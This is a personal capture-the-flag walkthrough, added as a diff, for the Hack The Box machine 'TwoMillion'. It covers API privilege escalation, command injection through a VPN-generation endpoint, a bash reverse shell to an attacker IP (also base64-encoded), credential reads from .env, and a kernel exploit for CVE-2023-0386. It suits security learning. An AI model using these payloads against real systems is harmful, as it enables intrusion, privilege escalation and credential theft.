@@ -1,0 +1,289 @@
+Box: TwoMillion
+IP: 10.129.229.66
+
+1. NMap -> nmap -sC -sV -O -oN nmap_results.txt 10.129.229.66
+
+	Port 22, 80 open
+
+	http://10.129.229.66 -> 2million.htb
+
+2. Gobuster -> gobuster dir -u http://2million.htb /usr/share/wordlist/dirbuster
+	
+	404's
+
+3. Gobuster -> gobuster dir -u http://10.129.229.66 /usr/share/wordlist/dirbuster
+
+	 301 -> http://10.129.229.66/913a04e6-c327-405f-86ba-a28d03bc51ed
+
+4. Need to add host to hostfile -> echo '10.10.10.11 2million.htb' | sudo tee -a /etc/hosts
+
+5. Tried to login to page, checked login request, uses PHPSESSID, could be vulnerable
+
+	https://www.exploit-db.com/papers/15990
+
+6. Re-running Gobuster -> same result as 2
+
+!!! => => => Library to use to unminify js code -> https://lelinhtinh.github.io/de4js/
+
+7. (Looking at walkthrough) => Go to invite page, classic HTB invite to find invite code in web page
+
+	Within 2million.htb/invite Developer Tools /js dir, is a file named inviteapi.min.js
+
+	Running this file through de4js, show the following code
+
+		function verifyInviteCode(code) {
+		    var formData = {
+			"code": code
+		    };
+		    $.ajax({
+			type: "POST",
+			dataType: "json",
+			data: formData,
+			url: '/api/v1/invite/verify',
+			success: function (response) {
+			    console.log(response)
+			},
+			error: function (response) {
+			    console.log(response)
+			}
+		    })
+		}
+
+		function makeInviteCode() {
+		    $.ajax({
+			type: "POST",
+			dataType: "json",
+			url: '/api/v1/invite/how/to/generate',
+			success: function (response) {
+			    console.log(response)
+			},
+			error: function (response) {
+			    console.log(response)
+			}
+		    })
+		}
+
+	The '/api/v1/invite/how/to/generate' looks to be how to generate flag
+
+8. curl -X POST '2million.htb/api/v1/invite/how/to/generate' | jq .
+
+	{
+	  "0": 200,
+	  "success": 1,
+	  "data": {
+	    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
+	    "enctype": "ROT13"
+	  },
+	  "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
+	}
+
+
+9. After decoding via cyber chef, the encoded data is the -> In order to generate the invite code, make a POST request to /api/v1/invite/generate
+
+10. curl -X POST '2million.htb/api/v1/invite/generate' | jq .
+
+	{
+	  "0": 200,
+	  "success": 1,
+	  "data": {
+	    "code": "TDNHMUctU0dVSUwtMVpHRTgtRFQxNEk=",
+	    "format": "encoded"
+	  }
+	}
+
+11. Base64 decode -> L3G1G-SGUIL-1ZGE8-DT14I
+
+12. Logged in, go to http://2million.htb/home/access (walkthrough)
+
+	Notice that two buttons, "Regenerate" and "Connection Pack" both use 2million.htb/api
+
+13. curl -v 2million.htb/api
+
+	Got 401
+
+14. Tried with cookie from logged in browser session -> curl -v 2million.htb/api --cookie "PHPSESSID=rgjtgkrucn42ppoul0gdor1i8b" 
+	Got 200
+
+15. Testing for other endpoints -> curl -v 2million.htb/api/v1 --cookie "PHPSESSID=rgjtgkrucn42ppoul0gdor1i8b"
+
+	{
+	  "v1": {
+	    "user": {
+	      "GET": {
+		"/api/v1": "Route List",
+		"/api/v1/invite/how/to/generate": "Instructions on invite code generation",
+		"/api/v1/invite/generate": "Generate invite code",
+		"/api/v1/invite/verify": "Verify invite code",
+		"/api/v1/user/auth": "Check if user is authenticated",
+		"/api/v1/user/vpn/generate": "Generate a new VPN configuration",
+		"/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
+		"/api/v1/user/vpn/download": "Download OVPN file"
+	      },
+	      "POST": {
+		"/api/v1/user/register": "Register a new user",
+		"/api/v1/user/login": "Login with existing user"
+	      }
+	    },
+	    "admin": {
+	      "GET": {
+		"/api/v1/admin/auth": "Check if user is admin"
+	      },
+	      "POST": {
+		"/api/v1/admin/vpn/generate": "Generate VPN for specific user"
+	      },
+	      "PUT": {
+		"/api/v1/admin/settings/update": "Update user settings"
+	      }
+	    }
+	  }
+	}
+
+16. Trying /api/v1/admin/auth endpoint -> curl -sv 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=q662jci3d2ffkfebl90f8iiaen" | jq
+
+	401
+
+17. Attempting PUT command (walkthrough) -> curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=q662jci3d2ffkfebl90f8iiaen" | jq
+
+	{
+	  "status": "danger",
+	  "message": "Invalid content type."
+	}
+
+
+18. Attempting PUT command and adding Content-Type header (walkthrough) -> curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=q662jci3d2ffkfebl90f8iiaen" --header "Content-Type: application/json" | jq
+
+	{
+	  "status": "danger",
+	  "message": "Missing parameter: email"
+	}
+
+19. Attempting PUT command and adding email parameter (walkthrough) -> curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=q662jci3d2ffkfebl90f8iiaen" --header "Content-Type: application/json" --data '{"email": "test@test.com" }' | jq
+
+	{
+	  "status": "danger",
+	  "message": "Missing parameter: is_admin"
+	}
+
+
+20. Attempting PUT command and adding is_admin parameter (walkthrough) -> curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=q662jci3d2ffkfebl90f8iiaen" --header "Content-Type: application/json" --data '{ "email": "test@test.com", "is_admin": "true" }' | jq
+
+	{
+	  "status": "danger",
+	  "message": "Variable is_admin needs to be either 0 or 1."
+	}
+
+21. Attempting PUT command and adding is_admin: 1 (walkthrough) -> curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=q662jci3d2ffkfebl90f8iiaen" --header "Content-Type: application/json" --data '{ "email": "test@test.com", "is_admin": 1 }' | jq
+
+	* Connected to 2million.htb (10.129.229.66) port 80 (#0)
+	> PUT /api/v1/admin/settings/update HTTP/1.1
+	> Host: 2million.htb
+	> User-Agent: curl/7.83.1
+	> Accept: */*
+	> Cookie: PHPSESSID=q662jci3d2ffkfebl90f8iiaen
+	> Content-Type: application/json
+	> Content-Length: 42
+	> 
+	} [42 bytes data]
+	* Mark bundle as not supporting multiuse
+	< HTTP/1.1 200 OK
+	< Server: nginx
+	< Date: Tue, 13 Jun 2023 01:05:40 GMT
+	< Content-Type: application/json
+	< Transfer-Encoding: chunked
+	< Connection: keep-alive
+	< Expires: Thu, 19 Nov 1981 08:52:00 GMT
+	< Cache-Control: no-store, no-cache, must-revalidate
+	< Pragma: no-cache
+	< 
+	{ [51 bytes data]
+	100    82    0    40  100    42    175    184 --:--:-- --:--:-- --:--:--   361
+	* Connection #0 to host 2million.htb left intact
+	{
+	  "id": 13,
+	  "username": "test",
+	  "is_admin": 1
+	}
+
+22. Re-running /api/v1/admin/auth endpoint -> curl -sv 2million.htb/api/v1/admin/auth --cookie "PHPSESSID=q662jci3d2ffkfebl90f8iiaen" | jq
+
+	200 -> { message: true }
+
+23. Checkout /api/v1/admin/vpn/generate endpoint -> curl -sv 2million.htb/api/v1/admin/generate --cookie "PHPSESSID=q662jci3d2ffkfebl90f8iiaen" --header "Content-Type: application/json" | jq
+
+	{
+	  "status": "danger",
+	  "message": "Missing parameter: username"
+	}
+
+24. Adding username paramemter -> curl -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=q662jci3d2ffkfebl90f8iiaen" --header "Content-Type: application/json" --data '{"username": "test"}'
+
+	VPN Config file was generated and given in the return
+
+25. Test for RCE potential with PHP exec/system command by adding ";id;" to have two bash commands take place (walkthrough) -> curl -X POST 2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=q662jci3d2ffkfebl90f8iiaen" --header "Content-Type: application/json" --data '{"username": "test;id;"}'
+
+	RCE confirmed -> uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+26. Deliver payload for reverse shell with following steps -> 
+
+	Create listener for reverse shell => nc -lvp 1234
+	
+	Use payload for creating shell => bash -i >& /dev/tcp/10.10.14.4/1234 0>&1
+
+	Encode command and execute => '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQo= | base64 -d | bash;"}'
+
+27. Enumerate web-directory for secrets -> cat .env
+
+	www-data@2million:~/html$ cat .env
+		DB_HOST=127.0.0.1
+		DB_DATABASE=htb_prod
+		DB_USERNAME=admin
+		DB_PASSWORD=SuperDuperPass123
+
+28. Enumerate users -> cat /etc/passwd
+
+29. SSH via admin creds -> ssh admin@2million.htb
+
+30. User FLAG found in ~ -> 35bff10707f571d13cf71eaa7f406dbf
+
+31. Admin mail reveals info about critical vuln (walkthrough) -> cat /var/mail/mail
+
+		From: ch4p <ch4p@2million.htb>
+		To: admin <admin@2million.htb>
+		Cc: g0blin <g0blin@2million.htb>
+		Subject: Urgent: Patch System OS
+		Date: Tue, 1 June 2023 10:45:22 -0700
+		Message-ID: <9876543210@2million.htb>
+		X-Mailer: ThunderMail Pro 5.2
+
+		Hey admin,
+
+		I'm know you're working as fast as you can to do the DB migration. 
+		While we're partially down, can you also upgrade the OS on our web host? 
+		There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. 
+		We can't get popped by that.
+
+		HTB Godfather
+
+32. Check vuln's with keywords "overlay fuse exploit" -> CVE-2023-0386 https://nvd.nist.gov/vuln/detail/CVE-2023-0386
+
+33. Check OS is vulnerable version -> uname -a
+
+	Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+
+34. Download exploit (to own machine, not compromised one)-> git clone https://github.com/xkaneiki/CVE-2023-0386
+
+35. Zip the exploit to scp over -> zip -r cve.zip CVE-2023-0386; scp cve.zip admin@2million.htb:/tmp
+
+36. Make and run exploit -> 
+	cd /tmp
+	unzip
+	cd CVE-2023-0386
+	make all
+
+	//Run first exploit command in background
+	./fuse ./ovlcap/lower ./gc &
+
+	//Run exploit
+	./exp
+
+37. root.txt -> /root/
